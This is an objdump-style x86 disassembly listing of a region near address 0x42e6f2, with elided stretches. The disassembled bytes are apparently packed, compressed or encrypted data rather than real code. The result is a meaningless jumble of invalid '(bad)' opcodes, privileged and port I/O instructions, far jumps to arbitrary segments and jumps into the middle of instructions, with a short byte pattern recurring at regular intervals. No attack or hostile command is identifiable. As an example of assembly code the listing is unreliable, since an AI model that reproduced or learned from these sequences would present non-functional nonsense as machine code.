  42e6f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e6f3:	mov    al,BYTE PTR [edx+ebp*2+0x30cb4522]
  42e6fa:	and    eax,DWORD PTR [eax-0x5e914bb3]
  42e700:	push   ds
  42e701:	sbb    DWORD PTR [ebp+ebx*2+0x78],esi
  42e705:	pop    ebx
  42e706:	cmp    al,bh
  42e708:	hlt    
  42e709:	dec    edx
  42e70a:	pop    ecx
  42e70b:	jo     0x42e777
  42e70d:	in     eax,0xce
  42e70f:	pop    eax
	...
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fisub  DWORD PTR [edx+0x48fb8db1]
  42e785:	icebp  
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	mov    esp,0xe60e4c4b
  42e791:	add    ebx,edx
  42e793:	int    0xa8
  42e795:	arpl   WORD PTR [ebp+0x10],cx
  42e798:	jg     0x42e7a8
  42e79a:	rol    DWORD PTR [edi-0x7c],1
  42e79d:	xchg   edi,eax
  42e79e:	aam    0xb6
  42e7a0:	push   ebp
  42e7a1:	mov    esp,0x546fa486
  42e7a6:	call   FWORD PTR [ebx]
  42e7a8:	stos   DWORD PTR es:[edi],eax
  42e7a9:	out    0xde,eax
  42e7ab:	fadd   QWORD PTR [eax-0x11]
  42e7ae:	or     DWORD PTR ds:0x41d717bf,0xf79e1b9a
  42e7b8:	mov    cl,0x8b
  42e7ba:	aam    0xca
  42e7bc:	cmp    BYTE PTR [eax+0x62fe7ece],ah
  42e7c2:	sar    BYTE PTR [esp+0x69],0xe2
  42e7c7:	ins    BYTE PTR es:[edi],dx
  42e7c8:	leave  
  42e7c9:	mov    dl,0x1f
  42e7cb:	jo     0x42e810
  42e7cd:	loope  0x42e7ca
  42e7cf:	je     0x42e834
  42e7d1:	pop    edi
  42e7d2:	dec    esp
  42e7d3:	mov    cl,dl
  42e7d5:	or     eax,0xbdf74379
  42e7da:	inc    eax
  42e7db:	leave  
  42e7dc:	pop    edi
  42e7dd:	pop    eax
  42e7de:	fldln2 
  42e7e0:	bound  esi,QWORD PTR [esi-0x4995b3b8]
  42e7e6:	ins    DWORD PTR es:[edi],dx
  42e7e7:	jno    0x42e817
  42e7e9:	ffree  st(4)
  42e7eb:	out    0x23,eax
  42e7ed:	dec    esp
  42e7ee:	push   edx
  42e7ef:	pop    esi
  42e7f0:	push   eax
  42e7f1:	jecxz  0x42e782
  42e7f3:	loopne 0x42e77e
  42e7f5:	jp     0x42e7de
  42e7f7:	shl    ch,cl
  42e7f9:	dec    esi
  42e7fa:	mov    bh,0x40
  42e7fc:	jg     0x42e7ad
  42e7fe:	(bad)  
  42e7ff:	cmp    DWORD PTR [edx],esp
  42e801:	fs mov ah,0x68
  42e804:	xchg   edx,eax
  42e805:	out    0x55,eax
  42e807:	rol    bl,1
  42e809:	adc    al,0xa5
  42e80b:	dec    ecx
  42e80c:	push   ss
  42e80d:	sbb    esp,eax
  42e80f:	push   0xf3675b86
  42e814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e815:	sti    
  42e816:	push   ebp
  42e817:	outs   dx,DWORD PTR ds:[esi]
  42e818:	sbb    eax,0x97ac04dc
  42e81d:	in     al,dx
  42e81e:	sbb    al,0x66
  42e820:	in     eax,0x79
  42e822:	pop    esp
  42e823:	jmp    0x42e876
  42e825:	mov    ecx,0x753f61b6
  42e82a:	or     ebp,DWORD PTR [ebx-0x6d]
  42e82d:	mov    ecx,0xf8a09bc2
  42e832:	xchg   edi,eax
  42e833:	cwde   
  42e834:	jo     0x42e87f
  42e836:	xchg   ebx,eax
  42e837:	clc    
  42e838:	dec    ecx
  42e839:	add    BYTE PTR [esi],cl
  42e83b:	xchg   edi,eax
  42e83c:	jl     0x42e8b1
  42e83e:	(bad)  
  42e840:	cmp    al,BYTE PTR [eax-0xfd24d28]
  42e846:	pop    es
  42e847:	jae    0x42e876
  42e849:	and    eax,0xf4644d1e
  42e84e:	push   es
  42e84f:	clc    
  42e850:	mov    edx,0xb14d91c7
  42e855:	enter  0xca8c,0xaf
  42e859:	test   al,0xdc
  42e85b:	mov    ds:0x2e91a40f,eax
  42e860:	pop    esi
  42e861:	inc    ebx
  42e862:	push   ss
  42e863:	jge    0x42e8b4
  42e865:	clc    
  42e866:	retf   0x2beb
  42e869:	fidiv  WORD PTR [ebx-0x284466e5]
  42e86f:	push   edx
  42e870:	sbb    bl,BYTE PTR [ebx]
  42e872:	in     eax,0x7d
  42e874:	push   0xc6e8950f
  42e879:	mov    ebx,0xbc56372e
  42e87e:	dec    ebx
  42e87f:	pop    esp
  42e880:	cwde   
  42e881:	les    ecx,FWORD PTR [ebx]
  42e883:	enter  0x57a0,0x47
  42e887:	and    esp,edx
  42e889:	call   FWORD PTR [eax+0x1]
  42e88c:	ret    
  42e88d:	fwait
  42e88e:	(bad)  
  42e88f:	sbb    eax,0x0
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0x54dc07d5]
  42e901:	cmp    dl,ah
  42e903:	mov    al,0x4c
  42e905:	repnz add DWORD PTR [eax],eax
  42e908:	add    al,0x1
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	mov    esp,0x7b17d27d
  42e911:	xchg   ecx,eax
  42e912:	sbb    BYTE PTR [edx],al
  42e914:	retf   
  42e915:	js     0x42e8df
  42e917:	lea    ebp,[ebp-0x2c]
  42e91a:	into   
  42e91b:	outs   dx,DWORD PTR ds:[esi]
  42e91c:	xchg   DWORD PTR [ebp-0x4edac51c],ebp
  42e922:	jle    0x42e992
  42e924:	adc    DWORD PTR ds:0x407e4fef,0x806bd088
  42e92e:	cmc    
  42e92f:	push   eax
  42e930:	rol    BYTE PTR [ebx-0x7d],1
  42e933:	mov    al,ds:0x5132be72
  42e938:	arpl   WORD PTR [ebx],di
  42e93a:	mov    eax,ds:0xf84bd4ab
  42e93f:	or     al,0x64
  42e941:	out    dx,al
  42e942:	push   es
  42e943:	(bad)  
  42e944:	mov    bh,0xd3
  42e946:	jge    0x42e987
  42e948:	(bad)  
  42e949:	das    
  42e94a:	ss and eax,0x3d077169
  42e950:	mov    bh,0x48
  42e952:	mov    cl,0x2e
  42e954:	je     0x42e8eb
  42e956:	inc    edi
  42e957:	mov    ebp,0xf08ea458
  42e95c:	inc    esp
  42e95d:	adc    dl,dl
  42e95f:	sub    eax,0xa181af69
  42e964:	mov    dl,0x5b
  42e966:	enter  0x6bd3,0xf7
  42e96a:	rol    DWORD PTR [esi],1
  42e96c:	js     0x42e958
  42e96e:	adc    ecx,DWORD PTR [edi-0x49c22acf]
  42e974:	sbb    BYTE PTR [ebp+0xd4f132],cl
  42e97a:	inc    eax
  42e97b:	ds scas al,BYTE PTR es:[edi]
  42e97d:	lock bound eax,QWORD PTR [esi*8-0xe79f5a6]
  42e985:	aam    0xca
  42e987:	adc    ecx,DWORD PTR ds:0x857b8a8d
  42e98d:	push   edx
  42e98e:	mov    ds:0xde549cf4,al
  42e993:	sub    ch,BYTE PTR [edx-0x2ff595ac]
  42e999:	cld    
  42e99a:	enter  0xef06,0x84
  42e99e:	add    edx,DWORD PTR [ecx-0x1cda125b]
  42e9a4:	popa   
  42e9a5:	pop    ss
  42e9a6:	xchg   ebp,eax
  42e9a7:	sbb    DWORD PTR [eax],edi
  42e9a9:	mov    bh,0x11
  42e9ab:	aaa    
  42e9ac:	pop    ebx
  42e9ad:	lods   eax,DWORD PTR ds:[esi]
  42e9ae:	jmp    0x96e7:0x11a3bc55
  42e9b5:	push   0x26
  42e9b7:	in     al,dx
  42e9b8:	push   ebx
  42e9b9:	les    ecx,FWORD PTR [ebp+ecx*4-0x637987bf]
  42e9c0:	cmp    DWORD PTR [edx+edx*1-0x612b15f7],0xffffffdc
  42e9c8:	fimul  WORD PTR [bx+si-0x24]
  42e9cc:	jmp    0xe321a334
  42e9d1:	into   
  42e9d2:	daa    
  42e9d3:	mov    ah,0x9f
  42e9d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9d6:	xchg   DWORD PTR [eax-0x3795e621],eax
  42e9dc:	in     eax,dx
  42e9dd:	call   0x264a:0x77ebb8c5
  42e9e4:	xor    eax,0x262620fc
  42e9e9:	loop   0x42ea50
  42e9eb:	adc    eax,0x43f8ecc0
  42e9f0:	aaa    
  42e9f1:	inc    ecx
  42e9f2:	repnz out dx,eax
  42e9f4:	bound  edi,QWORD PTR [ebx+ebp*8+0x2efda161]
  42e9fb:	xchg   ebx,eax
  42e9fc:	push   esp
  42e9fd:	call   0xaad7cfb3
  42ea02:	pop    eax
  42ea03:	sbb    BYTE PTR [ebx+0x68a7347a],dl
  42ea09:	push   eax
  42ea0a:	jmp    FWORD PTR [eax+0x33]
  42ea0d:	jbe    0x42e9b3
  42ea0f:	lahf   
	...
  42ea74:	in     eax,0xba
  42ea76:	xchg   edx,eax
  42ea77:	jecxz  0x42ea58
  42ea79:	jmp    0x42ea70
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	jle    0x42eaea
  42ea82:	(bad)  
  42ea83:	xor    DWORD PTR [eax-0xd],edx
  42ea86:	add    DWORD PTR [eax],eax
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	fcom   QWORD PTR [eax-0x18]
  42ea8f:	addr16 addr16 add ah,dh
  42ea93:	pop    ebp
  42ea94:	push   cs
  42ea95:	add    BYTE PTR [edx+0x6b],ah
  42ea98:	pop    es
  42ea99:	cs add al,0x8b
  42ea9c:	pop    ebp
  42ea9d:	inc    eax
  42ea9e:	mov    ebx,0xfc7ed4af
  42eaa3:	pop    ebx
  42eaa4:	aad    0x6e
  42eaa6:	std    
  42eaa7:	scas   al,BYTE PTR es:[edi]
  42eaa8:	mov    esp,0x1ca97967
  42eaad:	(bad)  
  42eaae:	ficom  WORD PTR [eax]
  42eab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eab1:	xor    cl,BYTE PTR [eax+0x5ecd946f]
  42eab7:	dec    esi
  42eab8:	scas   eax,DWORD PTR es:[edi]
  42eab9:	xchg   edx,eax
  42eaba:	pusha  
  42eabb:	mov    ds:0x5b2b99c2,al
  42eac0:	jne    0x42ea63
  42eac2:	dec    eax
  42eac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eac5:	cmp    ch,BYTE PTR [edx+edx*2-0x7d]
  42eac9:	je     0x42eae0
  42eacb:	jge    0x42eab1
  42eacd:	fld    QWORD PTR [edi-0x510d8329]
  42ead3:	clc    
  42ead4:	add    al,0x60
  42ead6:	cmp    al,0x14
  42ead8:	push   es
  42ead9:	(bad)  
  42eadb:	xlat   BYTE PTR ds:[ebx]
  42eadc:	iret   
  42eadd:	nop
  42eade:	jo     0x42eac3
  42eae0:	jno    0x42eb57
  42eae2:	or     ebp,esp
  42eae4:	mov    eax,0x74a8890d
  42eae9:	bound  edx,QWORD PTR [edi+0x31]
  42eaec:	pop    eax
  42eaed:	pop    esi
  42eaee:	adc    ebp,DWORD PTR [esi]
  42eaf0:	adc    ah,cl
  42eaf2:	call   FWORD PTR [ebx-0x1ca28ac6]
  42eaf8:	addr16 hlt 
  42eafa:	jle    0x42eb2f
  42eafc:	pop    edx
  42eafd:	add    al,0xe7
  42eaff:	and    eax,esi
  42eb01:	retf   0x173e
  42eb04:	sbb    al,0x4e
  42eb06:	rcr    BYTE PTR es:[ebp+esi*4+0x24],cl
  42eb0b:	xor    edx,DWORD PTR [ebp+0x79723438]
  42eb11:	jp     0x42eb37
  42eb13:	retf   0x64e
  42eb16:	push   esi
  42eb17:	aaa    
  42eb18:	sbb    ah,BYTE PTR [edi-0x13]
  42eb1b:	cmp    ah,BYTE PTR [edx-0x7d68197c]
  42eb21:	fwait
  42eb22:	add    DWORD PTR [ecx-0x38ed33e8],eax
  42eb28:	dec    edx
  42eb29:	mov    WORD PTR [eax-0x5b3625cd],?
  42eb2f:	jbe    0x42ead8
  42eb31:	cmp    esp,DWORD PTR [ebx-0x190ba4bc]
  42eb37:	pop    ds
  42eb38:	mov    BYTE PTR [edi],ah
  42eb3a:	gs mov ebx,0x63326868
  42eb40:	test   DWORD PTR [esi],0xc5b4dfe4
  42eb46:	es cmp eax,0xf6791c01
  42eb4c:	sub    eax,DWORD PTR [ebx+0x3a]
  42eb4f:	arpl   WORD PTR [eax+0x352caf54],si
  42eb55:	push   ds
  42eb56:	xchg   esi,eax
  42eb57:	(bad)  
  42eb58:	cs inc ebx
  42eb5a:	and    ch,cl
  42eb5c:	add    DWORD PTR [edi-0x22],0xd7bb9357
  42eb63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb64:	(bad)  
  42eb65:	cmp    eax,0x51f056e7
  42eb6a:	loope  0x42ebc3
  42eb6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb6d:	(bad)  
  42eb6e:	or     eax,0x72007a22
  42eb73:	sbb    DWORD PTR [ecx-0x5a],eax
  42eb76:	jo     0x42eb9a
  42eb78:	pop    ecx
  42eb79:	adc    ch,cl
  42eb7b:	xchg   esp,eax
  42eb7c:	in     eax,dx
  42eb7d:	add    BYTE PTR [ecx-0x4f],0x59
  42eb81:	lods   al,BYTE PTR ds:[esi]
  42eb82:	shl    BYTE PTR [ecx],cl
  42eb84:	hlt    
  42eb85:	mov    ch,0x51
  42eb87:	mov    ds:0xcb125e60,eax
  42eb8c:	mov    cl,0x22
  42eb8e:	test   eax,0xa3
	...
  42ebf3:	add    BYTE PTR [esi+0x41],bh
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	adc    DWORD PTR [edx+0x0],0xf4543998
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    al,0x1
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	out    0xa0,eax
  42ec0e:	imul   edi,DWORD PTR [ecx+0x6631bc91],0x9e99788a
  42ec18:	or     ebx,DWORD PTR [ebp-0x6e764a89]
  42ec1e:	(bad)  
  42ec1f:	(bad)
  42ec22:	sahf   
  42ec23:	cmp    eax,0xb3bb2d71
  42ec28:	push   eax
  42ec29:	adc    al,0xec
  42ec2b:	idiv   DWORD PTR [eax-0x29]
  42ec2e:	xchg   BYTE PTR [edi+ecx*8+0x47f20831],dh
  42ec35:	xor    esp,DWORD PTR [esi+0x22]
  42ec38:	inc    ebp
  42ec39:	loopne 0x42ec94
  42ec3b:	or     esp,ebp
  42ec3d:	dec    ebx
  42ec3e:	jle    0x42ec14
  42ec40:	push   0xfffffff0
  42ec42:	or     DWORD PTR [ecx-0x5c],0xffffff9c
  42ec46:	pop    eax
  42ec47:	xchg   esp,eax
  42ec48:	jne    0x42eca4
  42ec4a:	sub    al,0x20
  42ec4d:	shl    BYTE PTR [ebx+0x6d],cl
  42ec50:	push   cs
  42ec51:	sub    DWORD PTR [ebp+0x75],eax
  42ec54:	repz jns 0x42ec55
  42ec57:	push   eax
  42ec58:	cmc    
  42ec59:	paddsw mm4,QWORD PTR [eax]
  42ec5c:	cwde   
  42ec5d:	shl    dl,1
  42ec5f:	fdivr  QWORD PTR [ecx-0x6f]
  42ec62:	jmp    0x52c9:0xa22e6943
  42ec69:	xlat   BYTE PTR ds:[ebx]
  42ec6a:	mov    ebp,0x63edfff9
  42ec6f:	mov    cr2,esi
  42ec72:	jo     0x42ecdb
  42ec74:	jecxz  0x42ec43
  42ec76:	push   0x18ff128
  42ec7b:	pop    edi
  42ec7c:	adc    DWORD PTR [edx+0x21],0xffffffbc
  42ec80:	xchg   edx,eax
  42ec81:	leave  
  42ec82:	aad    0xe0
  42ec84:	std    
  42ec85:	xchg   esi,ebx
  42ec87:	push   ebp
  42ec88:	pop    edi
  42ec89:	xchg   ebx,eax
  42ec8a:	or     edx,DWORD PTR [edx+0x27]
  42ec8d:	aas    
  42ec8e:	cdq    
  42ec8f:	xor    BYTE PTR [ecx],al
  42ec91:	adc    al,0x87
  42ec93:	dec    ebx
  42ec94:	aam    0xf6
  42ec96:	push   ss
  42ec97:	fnstsw WORD PTR [edi+0x48aafb4f]
  42ec9d:	(bad)  
  42ec9e:	cld    
  42ec9f:	dec    edi
  42eca0:	addr16 leave 
  42eca2:	ret    
  42eca3:	mov    edi,DWORD PTR [ebx]
  42eca5:	test   DWORD PTR ds:[edi-0x7314225d],esp
  42ecac:	inc    ecx
  42ecad:	pop    ss
  42ecae:	inc    edx
  42ecaf:	lea    edx,[edi-0x7b]
  42ecb2:	data16 out 0x85,al
  42ecb5:	xchg   edx,eax
  42ecb6:	mov    gs,WORD PTR [ecx+eax*4+0x6a017ae9]
  42ecbd:	data16 addr16 mov dl,0x62
  42ecc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ecc2:	test   eax,0xa91ff970
  42ecc7:	ds mov bh,0x9b
  42ecca:	std    
  42eccb:	push   edi
  42eccc:	jge    0x42ecb0
  42ecce:	dec    esi
  42eccf:	or     bl,bl
  42ecd1:	sub    DWORD PTR es:[edx+0x7c],esp
  42ecd5:	retf   0x13c2
  42ecd8:	or     al,0x29
  42ecda:	retf   
  42ecdb:	adc    ch,0x1
  42ecde:	bnd jb 0x42ec8e
  42ece1:	(bad)  
  42ece2:	jbe    0x42ec87
  42ece4:	inc    eax
  42ece5:	sahf   
  42ece6:	pusha  
  42ece7:	xchg   ebx,eax
  42ece8:	mov    bh,0x43
  42ecea:	add    BYTE PTR [esi-0x4f],ah
  42eced:	mov    ch,0xe8
  42ecef:	out    dx,al
  42ecf0:	adc    dh,dh
  42ecf2:	fadd   st,st(4)
  42ecf4:	int3   
  42ecf5:	xor    cl,BYTE PTR [ecx-0x7f]
  42ecf8:	mov    ds:0x7ea263c7,al
  42ecfd:	popa   
  42ecfe:	in     eax,dx
  42ecff:	lock dec ebx
  42ed01:	cmp    DWORD PTR [edx+0x49],eax
  42ed04:	inc    edi
  42ed05:	cmp    eax,0x4ddbeb94
  42ed0a:	mov    cl,BYTE PTR [edx]
  42ed0c:	xchg   BYTE PTR [eax+edi*1+0xe2],bh
	...
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp-0x5e0a635e]
  42ed83:	pop    ebx
  42ed84:	pop    eax
  42ed85:	cmc    
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed8d:	cmp    eax,0x88501b35
  42ed92:	test   DWORD PTR [eax+0x73393a7a],ecx
  42ed98:	fwait
  42ed99:	adc    ch,BYTE PTR [eax-0x782f40ab]
  42ed9f:	jmp    0x42ee0f
  42eda1:	dec    esp
  42eda2:	adc    DWORD PTR [ebp-0x56d3ea95],eax
  42eda8:	hlt    
  42eda9:	ds xchg esi,eax
  42edab:	jge    0x42edf5
  42edad:	pop    ecx
  42edae:	push   ecx
  42edaf:	mov    ecx,0x8530868f
  42edb4:	pop    edx
  42edb5:	gs jg  0x42ed4c
  42edb8:	adc    ebp,ebx
  42edba:	pop    ss
  42edbb:	xchg   ch,cl
  42edbd:	mov    al,ds:0xa1165e8d
  42edc2:	or     BYTE PTR [edi-0x58d03c66],cl
  42edc8:	lods   al,BYTE PTR ds:[esi]
  42edc9:	mov    esi,0x4f498693
  42edce:	xor    BYTE PTR [eax+0x580525cf],0x7e
  42edd5:	int3   
  42edd6:	stos   DWORD PTR es:[edi],eax
  42edd7:	out    dx,al
  42edd8:	punpckhbw mm4,mm2
  42eddb:	aam    0xa3
  42eddd:	in     al,dx
  42edde:	das    
  42eddf:	mov    esi,0x7309668b
  42ede4:	dec    edx
  42ede5:	stos   DWORD PTR es:[edi],eax
  42ede6:	add    DWORD PTR [eax],eax
  42ede8:	mov    dh,0x4
  42edea:	mov    ah,0x12
  42edec:	imul   ah
  42edee:	sahf   
  42edef:	push   0xffffffe5
  42edf1:	push   ebx
  42edf2:	jb     0x42edb6
  42edf4:	mov    ebx,cs
  42edf6:	xchg   DWORD PTR [ecx],eax
  42edf8:	call   0xefc49f1c
  42edfd:	(bad)  
  42edfe:	push   eax
  42edff:	pusha  
  42ee00:	mov    ebp,0xecd800ca
  42ee05:	dec    esi
  42ee06:	ds sbb eax,0xeb0ed833
  42ee0c:	sti    
  42ee0d:	(bad)  
  42ee0e:	xchg   ebp,eax
  42ee0f:	hlt    
  42ee10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ee11:	jno    0x42ee36
  42ee13:	in     eax,dx
  42ee14:	fsubr  DWORD PTR [esi]
  42ee16:	pop    ds
  42ee17:	xor    eax,0x467d1856
  42ee1c:	int3   
  42ee1d:	loopne 0x42ee47
  42ee1f:	push   edx
  42ee20:	pushf  
  42ee21:	cwde   
  42ee22:	push   ss
  42ee23:	xor    eax,0x85fd97f0
  42ee28:	or     al,0x4c
  42ee2a:	mov    ch,0xd4
  42ee2c:	xor    al,0xed
  42ee2e:	cdq    
  42ee2f:	js     0x42edb1
  42ee31:	fldenv [esi-0x12]
  42ee34:	sub    edx,ecx
  42ee36:	outs   dx,DWORD PTR ds:[esi]
  42ee37:	ret    
  42ee38:	in     eax,dx
  42ee39:	sbb    eax,0x6c2278ae
  42ee3e:	and    al,0x15
  42ee40:	mov    cs:0x6da12a7,eax
  42ee46:	sbb    dl,dh
  42ee48:	pusha  
  42ee49:	jg     0x42ee99
  42ee4b:	loopne 0x42ede8
  42ee4d:	sbb    al,0x9a
  42ee4f:	out    0x25,al
  42ee51:	dec    ecx
  42ee52:	hlt    
  42ee53:	push   esp
  42ee54:	sahf   
  42ee55:	cmp    al,0xd8
  42ee57:	daa    
  42ee58:	jo     0x42ee8c
  42ee5a:	mov    cl,bh
  42ee5c:	push   ecx
  42ee5d:	idiv   eax
  42ee5f:	xchg   ebp,eax
  42ee60:	jg     0x42eeb6
  42ee62:	cmp    al,0xd
  42ee64:	sbb    eax,0x4a0bf241
  42ee69:	retf   0x2ba0
  42ee6c:	inc    edi
  42ee6d:	push   ds
  42ee6e:	and    edi,0x1a
  42ee71:	hlt    
  42ee72:	retf   0x4c
  42ee75:	mov    BYTE PTR [edi+0x72a2513c],cl
  42ee7b:	ds jmp 0x42eeb7
  42ee7e:	inc    ebp
  42ee7f:	inc    edi
  42ee80:	addr16 jns 0x42ee75
  42ee83:	mov    ds:0xe3c1ea39,eax
  42ee88:	mov    edx,0x9d444bc8
  42ee8d:	mov    esi,0x3a6
	...
  42eef2:	add    BYTE PTR [eax],al
  42eef4:	ret    
  42eef5:	add    cl,BYTE PTR [eax]
  42eef7:	xor    eax,0xf6ff3fc9
  42eefc:	jb     0x42ef3a
  42eefe:	jae    0x42ef25
  42ef00:	pop    ds
  42ef01:	(bad)  [eax]
  42ef03:	jne    0x42ef61
  42ef05:	test   BYTE PTR [ecx],0x0
  42ef08:	add    al,0x1
  42ef0a:	add    BYTE PTR [eax],al
  42ef0c:	pop    ebx
  42ef0d:	lods   eax,DWORD PTR ds:[esi]
  42ef0e:	sub    dh,al
  42ef10:	jno    0x42ef89
  42ef12:	jbe    0x42ef52
  42ef14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef15:	mov    al,0xc5
  42ef17:	jo     0x42eeda
  42ef19:	dec    esi
  42ef1a:	xchg   BYTE PTR [esi],bl
  42ef1c:	xchg   BYTE PTR [ecx-0x9],ah
  42ef1f:	push   cs
  42ef20:	into   
  42ef21:	xor    eax,0x8dd6fc3e
  42ef26:	and    DWORD PTR [eax],ecx
  42ef28:	or     al,0xac
  42ef2a:	leave  
  42ef2b:	bound  eax,QWORD PTR [ecx-0x748f717a]
  42ef31:	(bad)  
  42ef33:	xchg   BYTE PTR [ecx],dh
  42ef35:	jl     0x42eebb
  42ef37:	and    eax,0x4c8f9006
  42ef3c:	jnp    0x42efab
  42ef3e:	pop    ebp
  42ef3f:	ja     0x42ef89
  42ef41:	adc    ah,bl
  42ef43:	call   0x550d:0x8f9efac9
  42ef4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef4b:	sahf   
  42ef4c:	adc    bl,al
  42ef4e:	mov    bh,dl
  42ef50:	xchg   BYTE PTR [edi+0x3],ah
  42ef53:	popf   
  42ef54:	pop    ebx
  42ef55:	addr16 mov cl,0x45
  42ef58:	cld    
  42ef59:	xchg   esp,eax
  42ef5a:	sub    ah,BYTE PTR [edi]
  42ef5c:	loop   0x42efc6
  42ef5e:	mov    eax,ds:0x504a8552
  42ef63:	pusha  
  42ef64:	into   
  42ef65:	pop    esi
  42ef66:	adc    eax,0x4325a79
  42ef6b:	nop
  42ef6c:	(bad)
  42ef6f:	mov    eax,0x57a68a7c
  42ef74:	jp     0x42ef59
  42ef76:	adc    al,0x15
  42ef78:	or     DWORD PTR [edx-0xc],ebx
  42ef7b:	cld    
  42ef7c:	stos   BYTE PTR es:[edi],al
  42ef7d:	mov    edi,DWORD PTR [edi+0x39]
  42ef80:	dec    eax
  42ef81:	sbb    eax,0x854c6610
  42ef86:	sub    BYTE PTR [edi+0x66],al
  42ef89:	sub    al,0x7b
  42ef8b:	ja     0x42ef84
  42ef8d:	cmp    BYTE PTR [eax-0x74],bl
  42ef90:	sbb    dl,cl
  42ef92:	and    bh,BYTE PTR [edx]
  42ef94:	push   0xd29f5424
  42ef99:	test   eax,0x9706f76a
  42ef9e:	dec    edi
  42ef9f:	lods   eax,DWORD PTR ds:[esi]
  42efa0:	and    DWORD PTR [eax+0x39],edi
  42efa3:	xchg   ebx,eax
  42efa4:	stc    
  42efa5:	repnz cmp eax,0x8138a190
  42efab:	dec    esi
  42efac:	outs   dx,DWORD PTR ds:[esi]
  42efad:	sub    al,0xb4
  42efaf:	pop    ebp
  42efb0:	xchg   ecx,eax
  42efb1:	or     ch,bh
  42efb3:	outs   dx,DWORD PTR ds:[esi]
  42efb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42efb5:	mov    bh,0x21
  42efb7:	das    
  42efb8:	mov    ch,0x99
  42efba:	push   ebp
  42efbb:	outs   dx,DWORD PTR ds:[esi]
  42efbc:	jmp    0x23ac:0x5dd6995c
  42efc3:	(bad)  
  42efc4:	dec    ebp
  42efc5:	(bad)  
  42efc6:	cdq    
  42efc7:	mov    es,WORD PTR [ecx+0x4b]
  42efca:	leave  
  42efcb:	fiadd  DWORD PTR [edi]
  42efcd:	and    DWORD PTR [edi+edi*1+0x77],ebp
  42efd1:	cli    
  42efd2:	pop    esi
  42efd3:	xor    BYTE PTR [esi-0x6a2be10e],dl
  42efd9:	or     eax,0x9f09a527
  42efde:	(bad)  
  42efdf:	in     al,dx
  42efe0:	iret   
  42efe1:	test   BYTE PTR [ebp-0x48af3836],0x95
  42efe8:	fldenv [esi-0x42329d61]
  42efee:	and    BYTE PTR [esi-0x48cfa1da],0x26
  42eff5:	std    
  42eff6:	push   ebx
  42eff7:	scas   eax,DWORD PTR es:[edi]
  42eff8:	xor    dh,BYTE PTR [esi+ebx*1-0x1d25de65]
  42efff:	adc    edx,DWORD PTR [ecx-0x7a]
  42f002:	cwde   
  42f003:	lods   al,BYTE PTR ds:[esi]
  42f004:	xchg   DWORD PTR [ecx-0x1d],edx
  42f007:	mov    al,0xac
  42f009:	ficom  WORD PTR [edx]
  42f00b:	scas   eax,DWORD PTR es:[edi]
  42f00c:	adc    al,0xc3
  42f00e:	jno    0x42ef95
	...
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	mov    al,0x4
  42f082:	jnp    0x42f050
  42f084:	pusha  
  42f085:	test   DWORD PTR [ecx],0x10400
  42f08b:	add    BYTE PTR [edi-0xd],cl
  42f08e:	xor    DWORD PTR ds:0x604ee5f8,esi
  42f094:	inc    esi
  42f095:	retf   
  42f096:	adc    al,0xd2
  42f098:	cs xor al,0xb
  42f09b:	sub    DWORD PTR [edx+0x42757101],eax
  42f0a1:	mov    ecx,0xa11fd5df
  42f0a6:	cwde   
  42f0a7:	call   0xe735ad5c
  42f0ac:	adc    eax,0xf284a7df
  42f0b1:	xor    edi,esp
  42f0b3:	arpl   bp,si
  42f0b5:	out    0xb3,al
  42f0b7:	out    dx,al
  42f0b8:	pushf  
  42f0b9:	sub    BYTE PTR [edi],dh
  42f0bb:	aaa    
  42f0bc:	jno    0x42f102
  42f0be:	call   0xb69a:0x19a6e5b7
  42f0c5:	mov    ah,0xac
  42f0c7:	leave  
  42f0c8:	out    dx,eax
  42f0c9:	lods   al,BYTE PTR ds:[esi]
  42f0ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f0cb:	pop    edx
  42f0cc:	or     BYTE PTR [edi-0x1462c2d8],al
  42f0d2:	test   al,0xee
  42f0d4:	dec    ebp
  42f0d5:	jne    0x42f0a1
  42f0d7:	jge    0x42f140
  42f0d9:	cmp    BYTE PTR [ebp-0x1f],ch
  42f0dc:	adc    dh,ah
  42f0de:	fsub   QWORD PTR [eax+0x74]
  42f0e1:	aad    0x36
  42f0e3:	dec    esp
